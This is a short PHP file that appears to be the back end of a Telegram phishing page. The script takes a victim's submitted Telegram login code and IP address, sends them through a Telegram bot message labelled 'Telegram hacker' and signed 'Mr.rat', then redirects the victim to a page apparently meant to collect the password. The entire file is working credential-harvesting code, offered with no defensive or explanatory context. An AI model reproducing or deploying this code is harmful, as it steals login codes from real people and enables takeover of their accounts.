<?php
include ("jdf.php");
if (!empty($_POST)) {
    require_once 'Telegram.php';

    Telegram::sendMessage('🔐 تلگرام هکر 🔐'."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🔸کد ورود :'.$_POST['code']."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'📱آیدی:'.$_SERVER['REMOTE_ADDR']."\n".'⏱ساعت:'.jdate("h:i:s a")."\n".'⏰تاریخ:'.jdate('l Y F ')."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".''."\n".'🆔 Mr.rat');


}

header ('Location: twe-pas.html');

?>

